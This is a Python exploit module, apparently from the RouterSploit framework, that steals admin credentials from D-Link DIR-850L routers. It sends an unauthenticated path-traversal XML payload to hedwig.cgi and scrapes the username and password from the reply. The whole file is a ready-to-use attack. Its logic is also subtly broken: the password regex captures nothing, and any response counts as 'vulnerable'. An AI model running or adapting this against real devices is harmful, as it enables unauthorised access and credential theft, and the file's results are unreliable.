import re
from random import randint

from routersploit import (
    exploits,
    mute,
    validators,
    http_request,
    print_table,
    print_success,
    print_error,
)


class Exploit(exploits.Exploit):
    """ D-Link DIR-850L remote code execution variant exploit that extracts username and password for the device. """
    __info__ = {
        'name': 'D-Link DIR-850L Credential Disclosure',
        'authors': [
            'Hack2Win',  # vulnerability discovery
            'GH0st3rs',  # routersploit module
        ],
        'description': 'D-Link DIR-850L remote code execution variant exploit that extracts username and password for the device.',
        'references': [
            'https://packetstormsecurity.com/files/145097/dlink-850-admin-creds-retriever.sh.txt',
            'https://www.rapid7.com/db/modules/exploit/linux/http/dlink_dir850l_unauth_exec',
            'https://blogs.securiteam.com/index.php/archives/3364'
        ],
        'devices': [
            'D-Link DIR-850L',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port', validators=validators.integer)
    response_body = ''

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")
            creds = []
            username = re.findall('<name>(.*)</name>', self.response_body)
            password = re.findall('<password></password>', self.response_body)
            creds.append((
                username[0] if username else 'Not found',
                password[0] if password else '<blank>'
            ))
            print_table(('User', 'Password'), *creds)
        else:
            print_error("Target is not vulnerable")

    @mute
    def check(self):
        url = '{}:{}/hedwig.cgi'.format(self.target, self.port)
        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 5.5;Windows NT)",
            "Content-Type": "text/xml",
            "Accept-Encoding": "gzip, deflate",
            "Cookie": "uid={random}".format(random=''.join([chr(randint(ord('a'), ord('z'))) for x in range(8)])),
            "Connection": "close",
        }
        XML_DATA = "<?xml version='1.0' encoding='utf-8'?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>"
        response = http_request(method='POST', url=url, headers=headers, data=XML_DATA)
        if not response:
            return False
        self.response_body = response.text
        return True
